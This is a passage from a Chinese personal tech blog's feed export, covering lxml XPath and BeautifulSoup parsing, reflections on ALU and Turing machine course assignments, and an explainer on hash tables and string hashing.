class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到。lxml会自动修改HTML代码。例子中不仅补全了li标签，还添加了body，html标签。</p><h3 id="从文件中读取html代码："><a class="header-anchor" href="#从文件中读取html代码：">¶</a>从文件中读取html代码：</h3><p>除了直接使用字符串进行解析，lxml还支持从文件中读取内容。我们新建一个hello.html文件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- hello.html --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link1.html&quot;</span>&gt;</span>first item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link2.html&quot;</span>&gt;</span>second item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-inactive&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link3.html&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;bold&quot;</span>&gt;</span>third item<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-1&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link4.html&quot;</span>&gt;</span>fourth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;item-0&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;link5.html&quot;</span>&gt;</span>fifth item<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后利用<code>etree.parse()</code>方法来读取文件。示例代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取外部文件 hello.html</span></span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = etree.tostring(html, pretty_print=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure><p>输入结果和之前是相同的。</p><h3 id="在lxml中使用XPath语法："><a class="header-anchor" href="#在lxml中使用XPath语法：">¶</a>在lxml中使用XPath语法：</h3><ol><li><p>获取所有li标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(html)  <span class="comment"># 显示etree.parse() 返回类型</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)  <span class="comment"># 打印&lt;li&gt;标签的元素集合</span></span><br></pre></td></tr></table></figure></li><li><p>获取所有li元素下的所有class属性的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下href为<code>www.baidu.com</code>的a标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a[@href=&quot;www.baidu.com&quot;]&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下所有span标签：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment">#result = html.xpath(&#x27;//li/span&#x27;)</span></span><br><span class="line"><span class="comment">#注意这么写是不对的：</span></span><br><span class="line"><span class="comment">#因为 / 是用来获取子元素的，而 &lt;span&gt; 并不是 &lt;li&gt; 的子元素，所以，要用双斜杠</span></span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li//span&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取li标签下的a标签里的所有class：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li/a//@class&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取最后一个li的a的href属性对应的值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">   </span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()]/a/@href&#x27;</span>)</span><br><span class="line"><span class="comment"># 谓语 [last()] 可以找到最后一个元素</span></span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li><li><p>获取倒数第二个li元素的内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="comment"># text 方法可以获取元素内容</span></span><br><span class="line"><span class="built_in">print</span>(result[<span class="number">0</span>].text)</span><br></pre></td></tr></table></figure></li><li><p>获取倒数第二个li元素的内容的第二种方式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">   </span><br><span class="line">html = etree.parse(<span class="string">&#x27;hello.html&#x27;</span>)</span><br><span class="line">result = html.xpath(<span class="string">&#x27;//li[last()-1]/a/text()&#x27;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure></li></ol><h2 id="BeautifulSoup4库"><a class="header-anchor" href="#BeautifulSoup4库">¶</a>BeautifulSoup4库</h2><p>使用流程：</p><ol><li>根据标签名进行获取节点</li><li>获取文本内容和属性</li></ol><h3 id="属性"><a class="header-anchor" href="#属性">¶</a>属性</h3><blockquote><p>soup.a.attrs   返回一字典，里面是所有属性和值<br>soup.a[‘href’] 获取href属性</p></blockquote><h3 id="文本"><a class="header-anchor" href="#文本">¶</a>文本</h3><blockquote><p><strong>soup.a.string</strong><br><strong>soup.a.text</strong><br><strong>soup.a.get_text()</strong><br>【注】当标签里面还有标签的时候，string获取的为None，其他两个获取纯文本内容</p></blockquote><h4 id="find方法"><a class="header-anchor" href="#find方法">¶</a>find方法</h4><blockquote><p><strong>soup.find(‘a’)</strong><br><strong>soup.find(‘a’, class_=‘xxx’)</strong><br><strong>soup.find(‘a’, title=‘xxx’)</strong><br><strong>soup.find(‘a’, id=‘xxx’)</strong><br><strong>soup.find(‘a’, id=re.compile(r’xxx’))</strong><br>【注】find只能找到符合要求的第一个标签，他返回的是一个对象</p></blockquote><h3 id="find-all方法"><a class="header-anchor" href="#find-all方法">¶</a>find_all方法</h3><blockquote><p>返回一个列表，列表里面是所有的符合要求的对象<br><strong>soup.find_all(‘a’)</strong><br><strong>soup.find_all(‘a’, class_=‘wang’)</strong><br><strong>soup.find_all(‘a’, id=re.compile(r’xxx’))</strong><br><strong>soup.find_all(‘a’, limit=2)</strong>   提取出前两个符合要求的a</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Crawler </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ALU Reflection</title>
      <link href="/2021/10/15/ALU%20Reflection/"/>
      <url>/2021/10/15/ALU%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1>ALU Reflection</h1><h2 id="一、-实现过程中的bug"><a class="header-anchor" href="#一、-实现过程中的bug">¶</a>一、 实现过程中的bug</h2><ol><li>char 与 int 的转换老是忘记……</li><li>减法参数传反了（主要是顺序不符合正常逻辑</li><li>字符串相等用 equals</li></ol><h2 id="二、-反思"><a class="header-anchor" href="#二、-反思">¶</a>二、 反思</h2><ol><li>代码没有经过充分的测试前，都是错误的，在后面调用前面未测试的模块只会增加调试的麻烦。</li><li>多使用assert尽早发现问题</li><li>左移右移用的蛮多的，应该抽象为函数，重复了好多次</li></ol><h2 id="三、-收获"><a class="header-anchor" href="#三、-收获">¶</a>三、 收获</h2><ol><li><p>恢复除法存在的bug，即被除数为负与除数恰好相加为0是，被判定为异号不够除，但实际是够的。<br>解决方法：可以到最后调整余数与商。</p></li><li><p>自己写测试用例，将int最大最小值，0，正负相乘等边界情况做测试，也可以写random</p></li><li><p>char数组转String</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.valueOf (Arrays.copyOfRange (arr, i, j))</span><br><span class="line">String.valueOf (Arrays.copyOf (arr, Length))</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈希</title>
      <link href="/2021/09/03/%E5%93%88%E5%B8%8C/"/>
      <url>/2021/09/03/%E5%93%88%E5%B8%8C/</url>
      
        <content type="html"><![CDATA[<h1>哈希</h1><p>哈希表就是集查找、插入和删除于一身的一种数据结构（算法题里一般只有插入和删除操作）。哈希的过程就是把一个大的数据范围映射到一个较小的数据范围内的过程，这一点跟离散化很像，可以把<strong>离散化</strong>看成极其特殊的哈希方式。</p><p>因为数据量很大，哈希表难免会出现碰撞，就是把两个不一样的数映射成一样的数，key1 ！= key2 ，hash（key1） == hash（key2）这种情况，所以我们要避免冲突。</p><h2 id="处理冲突的方法"><a class="header-anchor" href="#处理冲突的方法">¶</a>处理冲突的方法</h2><p>以下题为例：</p><blockquote><p>维护一个集合，支持如下几种操作：</p><p>I x，插入一个数 x（−10<sup>9</sup> ≤ x ≤ 10<sup>9</sup>）；<br>Q x，询问数 x 是否在集合中出现过；<br>现在要进行 N （1 ≤ N ≤ 10<sup>5</sup>）次操作，对于每个询问操作输出对应的结果。</p><p>输入格式<br>第一行包含整数 N，表示操作数量。</p><p>接下来 N 行，每行包含一个操作指令，操作指令为 I x，Q x 中的一种。</p><p>输出格式<br>对于每个询问指令 Q x，输出一个询问结果，如果 x 在集合中出现过，则输出Yes，否则输出 No。</p></blockquote><h3 id="1-拉链法——数组与链表的结合"><a class="header-anchor" href="#1-拉链法——数组与链表的结合">¶</a>1.拉链法——数组与链表的结合</h3><p>假设我们刚开始将11映射到3的位置上，我们就在3的位置处拉出一个链，将11加进去；倘若第二次映射，23也映射到了3的位置，我们就继续把23加进去。这种处理冲突的方法就是拉链法。</p><p><img src="https://i.loli.net/2021/09/03/XE91BtfRzTClrLZ.png" alt="在这里插入图片描述"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(<span class="keyword">int</span> data)</span> </span>&#123;</span><br><span class="line">    Link link = <span class="keyword">new</span> <span class="built_in">Link</span>(data);</span><br><span class="line">    <span class="keyword">int</span> key = link.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in">insert</span>(link);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Link <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">return</span> array[hashVal].<span class="built_in">find</span>(key);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    array[hashVal].<span class="built_in"><span class="keyword">delete</span></span>(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-开放寻址法"><a class="header-anchor" href="#2-开放寻址法">¶</a>2.开放寻址法</h3><p>基本思路比较容易理解就是只在一个数组中进行操作，防止溢出范围一般要开到题目范围的2-3倍。</p><p>假如我们求出的哈希值hash（x） == k，我们就在一个数组从第k个位置开始，如果该位置被占用，则依次看下一个位置，直到找到空位置为止。</p><p>找下一个位置也有不同的方法</p><h4 id="线性探测"><a class="header-anchor" href="#线性探测">¶</a><strong>线性探测</strong></h4><p>插入思路很朴素：下标一位一位后移，直到为空。查找同理，先算得理论下标，向后逐位比对，若遍历至空位，说明没有。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        <span class="comment">// 如果超过数组大小，则从第一个开始找</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null)&#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key)&#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        ++hashVal;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>线性探测哈希表的删除相对来说比较复杂一点，我们不能简单的把这一项数据删除，让它变成空，为什么呢？</p><p>线性探测哈希表在查找的时候，一旦我们通过线性探测方法，找到一个空闲位置，我们就可以认定哈希表中不存在这个数据。但是，如果这个空闲位置是我们后来删除的，就会<strong>导致原来的查找算法失效</strong>。本来存在的数据，会被认定为不存在。</p><p>因此我们需要一个<strong>特殊的数据</strong>来顶替这个被删除的数据，因为我们的学生学号都是正数，所以我们用学号等于<code>-1</code>来代表被删除的数据。这样会带来一个问题，如何在线性探测哈希表中做了多次操作，会导致哈希表中充满了学号为<code>-1</code>的数据项，使的哈希表的效率下降，所以很多哈希表中没有提供删除操作，即使提供了删除操作的，也尽量少使用删除函数。</p><h4 id="二次探测"><a class="header-anchor" href="#二次探测">¶</a><strong>二次探测</strong></h4><p>在线性探测哈希表中，数据会发生聚集，一旦聚集形成，它就会变的越来越大，那些哈希函数后落在聚集范围内的数据项，都需要一步一步往后移动，并且插入到聚集的后面，因此聚集变的越大，聚集增长的越快。这个就像我们在逛超市一样，当某个地方人很多时，人只会越来越多，大家都只是想知道这里在干什么。</p><p>二次探测是防止聚集产生的一种尝试，思想是探测相隔较远的单元，而不是和原始位置相邻的单元。在线性探测中，如果哈希函数得到的原始下标是x,线性探测就是x+1,x+2,x+3…，以此类推，而在二次探测中，探测过程是x+1,x+4,x+9,x+16,x+25…,以此类推，到原始距离的步数平方</p><h4 id="双哈希（常用）"><a class="header-anchor" href="#双哈希（常用）">¶</a><strong>双哈希</strong>（常用）</h4><p>双哈希是为了消除原始聚集和二次聚集问题，不管是线性探测还是二次探测，每次的探测步长都是固定的。双哈希是除了第一个哈希函数外再增加一个哈希函数用来根据关键字生成探测步长，这样即使第一个哈希函数映射到了数组的同一下标，但是探测步长不一样，这样就能够解决聚集的问题。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">(Student student)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> key = student.<span class="built_in">getKey</span>();</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="comment">// 获取步长</span></span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null &amp;&amp; array[hashVal].<span class="built_in">getKey</span>() != <span class="number">-1</span>) &#123;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        <span class="comment">// 如果超过数组大小，则从第一个开始找</span></span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    array[hashVal] = student;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">find</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            <span class="keyword">return</span> array[hashVal];</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Student <span class="title">delete</span><span class="params">(<span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> hashVal = <span class="built_in">hash</span>(key);</span><br><span class="line">    <span class="keyword">int</span> stepSize = <span class="built_in">stepHash</span>(key);</span><br><span class="line">    <span class="keyword">while</span> (array[hashVal] != null) &#123;</span><br><span class="line">        <span class="keyword">if</span> (array[hashVal].<span class="built_in">getKey</span>() == key) &#123;</span><br><span class="line">            Student temp = array[hashVal];</span><br><span class="line">            array[hashVal] = noStudent;</span><br><span class="line">            <span class="keyword">return</span> temp;</span><br><span class="line">        &#125;</span><br><span class="line">        hashVal +=stepSize;</span><br><span class="line">        hashVal %= size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>双哈希的实现比较简单，但是双哈希有一个特别高的要求就是表的容量需要是一个质数，为什么呢？</p><p><strong>为什么双哈希需要哈希表的容量是一个质数？</strong></p><p>假设我们哈希表的容量为15，某个**「关键字」**经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,0,5,10，一直只会尝试这三个位置，永远找不到空白位置来存放，最终会导致崩溃。</p><p>如果我们哈希表的大小为13，某个**「关键字」**经过双哈希函数后得到的数组下标为0，步长为5。那么这个探测过程是0,5,10,2,7,12,4,9,1,6,11,3。会查找到哈希表中的每一个位置。</p><p>使用开放地址法，不管使用那种策略都会有各种问题，开放地址法不怎么使用，在开放地址法中使用较多的是双哈希策略。</p><h2 id="字符串哈希"><a class="header-anchor" href="#字符串哈希">¶</a>字符串哈希</h2><p>通过比对字符串的哈希值的方法快速判断两个字符串是否相同，操作及思路比KMP方法简单。</p><h3 id="求字符串前缀的哈希值"><a class="header-anchor" href="#求字符串前缀的哈希值">¶</a>求字符串前缀的哈希值</h3><p>将一个字符串看成一个P进制的数，最后转化成10进制数</p><p>假如我们要求一个字符串ABCD的哈希值，ABCD对应1234</p><p>ABCD<br>1234<br>我们要求的就是字符串的前缀哈希值<br>h[0] = 0<br>h[1] = 'A’的哈希值<br>h[2] = 'AB’的哈希值<br>h[3] = 'ABC’的哈希值<br>h[4] = 'ABCD’的哈希值</p><p>ABCD的哈希值 h[4] =（1234）p = 1 * P3 + 2 * P 2 + 3 * P1 + 4 * P0</p><p>因为转化后的数字可能很大，所以我们要对所求的哈希值对Q取模</p><p>通过这样一种方式就可以把任意一个字符串映射成一个0~Q-1的数了</p><p>注意：<br>1.不能将字母映射成0，一般从1开始映射，不然会使不同的字符串的哈希值相同</p><p>2.有这样一组经验值，当P = 131 或 13331 Q = 264，且我们不那么非，在99.99%的情况下不存在冲突，<s>这可不是我说的</s></p><p>3.因为Q = 264，所以我们用unsigned long long来存储所有的哈希值，就不需要对Q取模了。因为会溢出，所以就等价于取模了</p><h3 id="求任意字串的哈希值"><a class="header-anchor" href="#求任意字串的哈希值">¶</a>求任意字串的哈希值</h3><p>我们可以利用我们所求得的前缀哈希用一个公式算出来任意一个子串的哈希值</p><p>假设我们已知两个前缀哈希值h[R],h[L - 1], 目标是求得L~R的哈希值</p><p>即h[L~R] = h[R] -h[L-1] * PR-L+1</p><p>证明过程如下：</p><p>h[R] = 1 * PR-1 + 2 * PR-2 + …+ R * P0<br>h[L-1] = 1 * PL-2 + 2 * PL-2 + …+ (L-1) * P0<br>要求的L~R的哈希值， 我们需要将h[L-1] * PR-L+1 = 1 * PR-1 + 2 * PR-2 + …+ (L-1) * PR-L+1<br>h[L~R] = L * PR-L + (L+1) * PR-L-1 + …+ R * P0 = h[R] - h[L-1] * PR-L+1</p><p>其实本质就是进制转换</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Algorithm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TM Reflection</title>
      <link href="/2021/07/23/TM%20Reflection/"/>
      <url>/2021/07/23/TM%20Reflection/</url>
      
        <content type="html"><![CDATA[<h1>TM Reflection</h1><p>这是第二次图灵机大作业完成后的反思与总结，将分为如下几部分：</p><ul><li>架构的反思</li><li>debug的过程</li></ul><h2 id="架构的反思"><a class="header-anchor" href="#架构的反思">¶</a>架构的反思</h2><p>1.TuringMachine的构造函数过于复杂，夹杂了许多功能，可创建Util工具类，使代码低耦合，数据与职责一致</p><p>2.Q, State,TransitionFuction之间的映射关系要理清，是个不错的架构，值得学习</p><p>3.对于Executor，它拥有的是Tapes，因此他的快照等功能应该是调用Tape的方法来“拼凑”实现整体，而不应该在Executor中调用到Tracks层面</p><h2 id="debug的过程"><a class="header-anchor" href="#debug的过程">¶</a>debug的过程</h2><p>1.第一次运行，什么错误信息都没有，什么输出都没有，合理推测问题在Execute方法，处理了一系列格式化问题，都怪猪脚需求写的不清楚（拍桌子）</p><p>发现需要知道空格符号，使我下定了改为自顶而下架构的决心，Executor没有理由需要知道B是什么符号，一次重构，费了点时间，但也算有收获</p><p>2.肉眼对比输出结果的我像个憨批，下次丕定（</p><p>3.第二次运行，发现多报了错误流信息，居然把String直接扔到Character集合中了，我当时怕是写傻了</p><p>4.顺手把错误检查全过了，Resolver判断是否冲突需要对上文所说两重映射完全理解</p><p>5.最后一出错点，挂掉我4个用例，居然是很浅显的错误，移动磁头（我一直很相信你的啊喂……），再一次警告自己不要乱复制</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
